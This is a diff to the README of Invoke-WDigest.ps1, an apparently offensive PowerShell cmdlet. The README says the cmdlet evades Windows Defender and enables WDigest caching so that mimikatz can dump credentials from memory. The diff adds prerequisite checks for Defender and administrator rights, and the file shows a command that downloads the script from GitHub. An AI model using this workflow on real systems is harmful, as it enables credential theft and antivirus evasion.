@@ -23,12 +23,23 @@
 <br /><br />
 
 **download Invoke-WDigest.ps1**
-> **Warning**: Invoke-WDigest.ps1 cmdlet only bypasses Anti-Virus detection if windows defender its the only AV running in target system.
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/DeviceGuard/Invoke-WDigest.ps1" -OutFile "Invoke-WDigest.ps1"
 ```
 
 <br />
+
+**Pre-Requesites Checks:**
+> **Warning**: Invoke-WDigest.ps1 cmdlet only bypasses Anti-Virus detection if windows defender its the only AV running in target system.
+```powershell
+#Make sure Windows Defender service its running
+[bool](Get-Service -Name "WinDefend")
+
+#Make sure we have administrator privileges in shell
+[bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")
+```
+
+<br /><br />
 
 **run cmdlet:**
 ```powershell
@@ -74,7 +85,7 @@ REMARK
    Child process its necessary for mimikatz 'sekurlsa::wdigest' dump the cred from Memory.
 ```
 
-<br />
+<br /><br />
 
 <b><i>Execute Mimikatz (interactive shell) without WDigest caching</i></b><br />
 ![interactive](https://user-images.githubusercontent.com/23490060/219967042-4559b463-5e3e-470d-8ffe-5111eae7f015.png)
